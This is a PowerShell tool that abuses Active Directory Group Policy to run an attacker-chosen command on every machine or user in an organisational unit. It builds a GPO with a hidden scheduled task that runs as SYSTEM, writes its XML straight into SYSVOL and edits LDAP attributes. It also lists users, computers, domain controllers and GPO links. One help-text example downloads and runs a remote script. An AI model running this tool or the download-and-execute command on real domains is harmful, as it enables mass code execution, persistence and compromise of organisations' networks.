Import-Module ActiveDirectory
Import-Module GroupPolicy

function Create {
<#
	.SYNOPSIS
		The function creates a GPO with an immediate task executing a command.
	
	.DESCRIPTION
		User have to choose a name for the GPO, the type of the GPO (Users or Computers), a command to execute and an OU where to link this GPO, and the function will create a GPO with this configuration.
	
	.PARAMETER Name
		Name of the GPO to be created.
		
	.PARAMETER Scope
		Type of the GPO : Users or Computers.
		
	.PARAMETER Command
		Powershell command to execute.
		
	.PARAMETER OU
		Name of OU to link the GPO to. The default value is the root OU.
	
	.EXAMPLE
		Create -Name "Ping all up computers" -Scope "Computers" -Command "ping.exe -n 1 100.100.100.118" -OU "OU=TKNX-Machines,DC=teknex,DC=lab"
	
	.EXAMPLE
		Create -Name "Execute a script" -Scope "Users" -Command "iex (new-object Net.WebClient).DownloadString('http://100.100.100.118:9000/script.ps1')"
	
#>
	
	param(
		[Parameter(Mandatory)]
		[string] $Name,
		
		[Parameter(Mandatory)]
	    [string] $Scope,
		
		[Parameter(Mandatory)]
	    [string] $Command,
		
		[string] $OU = (Get-ADDomain).DistinguishedName
		
	)
	
	try {
		Get-GPO -Name $Name -ErrorAction Stop | Out-Null
		Write-Host "GPO Name is already used, select another one."
		Write-Host "Exiting..."
		return
	} catch {}
	
	try {
		Get-ADOrganizationalUnit -Identity $OU -ErrorAction Stop | Out-Null
	} catch {
		try {
			Get-ADDomain         -Identity $OU -ErrorAction Stop | Out-Null
		} catch {
			Write-Host "OU doesn't exist, select another one."
			Write-Host "Exiting..."
			return
		}
	}
	
	$ScopeChosen = $Scope
	if ($Scope.ToLower() -eq "users") {
		$Scope = "User"
	} elseif ($Scope.ToLower() -eq "computers") {
		$Scope = "Machine"
	} else {
		Write-Host "Choose between Users and Computers"
		Write-Host "Exiting..."
		return
	}
	
	$Domain    = (Get-ADDomain).DNSRoot
	$DomainDN  = (Get-ADDomain).DistinguishedName
	
	if ($Scope -eq "Machine"){
		$UserID    = "NT AUTHORITY\SYSTEM"
		$LogonType = "S4U"
	} else {
		$UserID    = "%LogonDomain%\%LogonUser%"
		$LogonType = "InteractiveToken"
	}
	
	$Payload = @"
<?xml version="1.0" encoding="UTF-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="$Name" image="0" changed="$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))" uid="{$(((New-Guid).Guid).ToUpper())}" userContext="0" removePolicy="0"><Properties action="C" name="$Name" runAs="$UserID" logonType="$LogonType"><Task version="1.2"><RegistrationInfo><Author>$(whoami)</Author> <Description /></RegistrationInfo><Principals><Principal id="Author"><UserId>$UserID</UserId><LogonType>$LogonType</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden> <WakeToRun>true</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT1M</Interval><Count>5</Count></RestartOnFailure></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command><Arguments>-c "$Command"</Arguments></Exec></Actions></Task></Properties><Filters><FilterRunOnce hidden="1" not="0" bool="AND" id="{$(((New-Guid).Guid).ToUpper())}" /></Filters></ImmediateTaskV2></ScheduledTasks>
"@
	
	New-GPO                -Name $Name -ErrorAction Stop | Out-Null
	Write-Host "[INFO] GPO '$Name' created"
	
	New-GPLink -Target $OU -Name $Name -ErrorAction Stop | Out-Null
	Write-Host "[INFO] GPO linked to '$OU'"
	
	$GUID = (Get-GPO -Name $Name).Id.Guid.ToUpper()
	
	New-Item -ItemType "directory" -Path "C:\Windows\SYSVOL\sysvol\$Domain\Policies\{$GUID}\$Scope\Preferences\ScheduledTasks" | Out-Null
	New-Item -ItemType "directory" -Path "C:\Windows\SYSVOL\sysvol\$Domain\Policies\{$GUID}\$Scope\Scripts\Shutdown"           | Out-Null
	New-Item -ItemType "directory" -Path "C:\Windows\SYSVOL\sysvol\$Domain\Policies\{$GUID}\$Scope\Scripts\Startup"            | Out-Null
	Write-Host "[INFO] Created file tree"
	
	Out-File -Encoding ASCII -InputObject $Payload -FilePath "C:\Windows\SYSVOL\sysvol\$Domain\Policies\{$GUID}\$Scope\Preferences\ScheduledTasks\ScheduledTasks.xml"
	Write-Host "[INFO] Created Scheduled Task file"
	
	$VERSION_USER     = Get-Random -Minimum 1 -Maximum 20
	$VERSION_COMPUTER = Get-Random -Minimum 1 -Maximum 20
	$VERSION_USER     = [Convert]::ToString($VERSION_USER, 2)
	$VERSION_COMPUTER = [Convert]::ToString($VERSION_COMPUTER, 2).PadLeft(16, '0')
	$VERSIONNUMBER    = [Convert]::ToInt64( $VERSION_USER + $VERSION_COMPUTER, 2)
	
	$GPTINI = @"
[General]
Version=$VERSIONNUMBER
displayName=New GPO Object
"@
	
	Out-File -Encoding ASCII -InputObject $GPTINI -FilePath "C:\Windows\SYSVOL\sysvol\$Domain\Policies\{$GUID}\GPT.ini"
	Write-Host "[INFO] Created GPT file"

	if ($Scope -eq "Machine") {
		Set-ADObject -Identity "CN={$GUID},CN=Policies,CN=System,$DomainDN" -Replace @{gPCMachineExtensionNames='[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]'}
	} else {
		Set-ADObject -Identity "CN={$GUID},CN=Policies,CN=System,$DomainDN" -Replace @{gPCUserExtensionNames='[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]'}
	}
	Set-ADObject -Identity "CN={$GUID},CN=Policies,CN=System,$DomainDN" -Replace @{versionNumber="$VERSIONNUMBER"}
	Write-Host "[INFO] LDAP modified"
	
	Write-Host "`n---- GPO properly Created ----"
	Write-Host "  Name              :   $Name"
	Write-Host "  GUID              :   $GUID"
	Write-Host "  OU                :   $OU"
	Write-Host "  Scope             :   $ScopeChosen"
	Write-Host "  Command assigned  :   $Command"
	Write-Host "------------------------------"
}

function List {
<#
	.SYNOPSIS
		The function lists AD objects and their OU.
	
	.DESCRIPTION
		User have to choose bewteen Users, Computers, GPO and All to list object in the current AD. The function will show objects and the OU where they are or linked.
	
	.PARAMETER Choice
		Choice of the GPO objects to show (Users, Computers, GPO ou All)
	
	.EXAMPLE
		List "Users"
	
	.EXAMPLE
		List "All"
	
#>
	
	param (
	    [Parameter(Mandatory)]
	    [string] $Choice
	)
	
	$Choice = $Choice.ToLower()
	if ($Choice -notin @("users", "computers", "gpo", "all")) {
		Write-Host "Choose between Users, Computers, GPO and All"
		Write-Host "Exiting..."
		return
	}
	
	if ($Choice -in @("users", "all") ){
		$USERS = Get-ADUser -Filter "Enabled -eq 'True'"
		$USERS_by_OU = @{}
		
		foreach ($USER in $USERS) {
		    $OU = $USER.DistinguishedName.Split(',', 2)[1]
		    if ($USERS_by_OU.ContainsKey($OU)) {
		        $USERS_by_OU[$OU] += $USER
		    } else {
		        $USERS_by_OU[$OU] = @($USER)
		    }
		}
		
		Write-Host "- Enabled Users are in the following OUs:"
		foreach ($OU in $USERS_by_OU.Keys) {
		    Write-Host "     + $OU"
		    foreach ($USER in $USERS_by_OU[$ou]) {
		        Write-Host "     |   $($USER.Name)"
		    }
		    Write-Host ""
		}
		Write-Host ""
	}
	
	
	if ($Choice -in @("computers", "all") ){
		$COMPUTERS = Get-ADComputer -Filter "Enabled -eq 'True'" -Properties IPv4Address
		$DCs = Get-ADDomainController -Filter "Enabled -eq 'True'" | Select-Object -ExpandProperty Name
		$COMPUTERS_by_OU = @{}
		
		foreach ($COMPUTER in $COMPUTERS) {
		    $OU = $COMPUTER.DistinguishedName.Split(',', 2)[1]
		    if ($COMPUTERS_by_OU.ContainsKey($OU)) {
				$COMPUTERS_by_OU[$OU] += $COMPUTER
		    } else {
				$COMPUTERS_by_OU[$OU] = @($COMPUTER)
		    }
		}
		
		Write-Host "- Enabled Computers are in the following OUs:"
		foreach ($OU in $COMPUTERS_by_OU.Keys) {
		    Write-Host "    + $OU"
		    foreach ($COMPUTER in $COMPUTERS_by_OU[$ou]) {
				if ($DCs -contains $COMPUTER.Name) {
					Write-Host "    |   $($COMPUTER.Name)`t`t($($COMPUTER.IPv4Address))   $([char]0x1b)[31m[DC]$([char]0x1b)[0m"
				} else {
					Write-Host "    |   $($COMPUTER.Name)`t`t($($COMPUTER.IPv4Address))"
				}
		    }
		    Write-Host ""
		}
		Write-Host ""
	}
	
	
	if ($Choice -in @("gpo", "all") ){
		$OBJECTs = Get-ADObject -LDAPFilter '(|(objectclass=organizationalUnit)(objectclass=domainDNS))'
		$GPOs = Get-GPO -All
		
		Write-Host "- GPO and where they're linked:" 
		foreach ($GPO in $GPOs){
			Write-Host "    +   $($GPO.DisplayName)"
			foreach ($OBJECT in $OBJECTs) {
				$LINKs = Get-GPInheritance -Target $OBJECT.DistinguishedName
				foreach ($LINK in $LINKs) {
					if ($GPO.DisplayName -in $LINK.GpoLinks.DisplayName) {
						Write-Host "    |   $($OBJECT.DistinguishedName)"
					}
				}
			}
			Write-Host ""
		}
		Write-Host ""
	}
}

function Delete {
<#
	.SYNOPSIS
		The function deletes a GPO.
	
	.DESCRIPTION
		User have to choose a GPO Name to delete. The function will ask for a confirmation and show which links will be deleted.
	
	.PARAMETER Name
		Name of the GPO to delete.
	
	.EXAMPLE
		Delete "Ping all up computers"
	
#>

	param(
		[Parameter(Mandatory)]
	    [string] $Name
	)
	
	try {
		Get-GPO -Name $Name -ErrorAction Stop | Out-Null
	}
	catch { 
		Write-Host "No GPO exists with this name."
		Write-Host "Exiting..."
		return
	}
	
	$OBJECTs = Get-ADObject -LDAPFilter '(|(objectclass=organizationalUnit)(objectclass=domainDNS))'
	
	Write-Host "`n---- Deletion of the GPO ----"
	Write-Host "  Name   :   $Name"
	Write-Host -NoNewline "  Links  :   "
	foreach ($OBJECT in $OBJECTs) {
		$LINKs = Get-GPInheritance -Target $OBJECT.DistinguishedName
		foreach ($LINK in $LINKs) {
			if ($Name -in $LINK.GpoLinks.DisplayName) {
				Write-Host "$($OBJECT.DistinguishedName)"
			}
			Write-Host -NoNewline "             "
		}
	}
	Write-Host "`r-----------------------------"
	
	Write-Host "Are you sure to delete this GPO ? (Y/N)"
	$confirmation = Read-Host -NoNewline "   Answer"
	
	if ($confirmation -ne "Y" -And $confirmation -ne "Yes") {
		Write-Host "Exiting..."
		return
	}
	
	Remove-GPO -Name $Name -ErrorAction Stop | Out-Null
	Write-Host "GPO properly deleted"
}